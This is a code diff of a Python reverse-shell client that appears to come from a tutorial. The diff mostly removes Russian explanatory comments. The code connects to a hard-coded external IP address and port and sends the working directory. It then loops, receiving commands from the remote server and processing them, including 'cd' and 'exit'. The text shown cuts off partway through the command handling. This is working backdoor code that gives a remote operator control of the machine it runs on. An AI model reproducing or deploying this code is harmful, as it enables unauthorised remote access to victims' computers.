@@ -7,21 +7,20 @@ SERVER_HOST = "158.181.233.163"
 SERVER_PORT = 5003
 BUFFER_SIZE = 1024 * 128
 SEPARATOR = "---"
+s = socket.socket() 
+s.connect((SERVER_HOST, SERVER_PORT)) 
+cwd = os.getcwd() 
+s.send(cwd.encode()) 
 
-s = socket.socket() #Создаем экземпляр классa socket
-s.connect((SERVER_HOST, SERVER_PORT)) #Кортежом передаем методу connect айпи и порт нашего сервера
-cwd = os.getcwd() #Получаем адрес каталога, в котором находимся
-s.send(cwd.encode()) #Отправляем адрес серверу
 
 
-#Начинаем бесконечный цикл, в котором получаем команду от сервера и исполняем
 while True:
     command = s.recv(BUFFER_SIZE).decode()
-    #Разделяем команду по разделителю, который мы создали раньше
+    
     splited_command = command.split(SEPARATOR)
-    if command.lower() == "exit": #если получаенная команда, это "exit", выходим из цикла и закрываем подключение
+    if command.lower() == "exit": 
         break
-    if "cd " in command: #Если "слово" cd присутствует в нашей команде
+    if "cd " in command: 
         try:
             """
             Удаляем "cd"
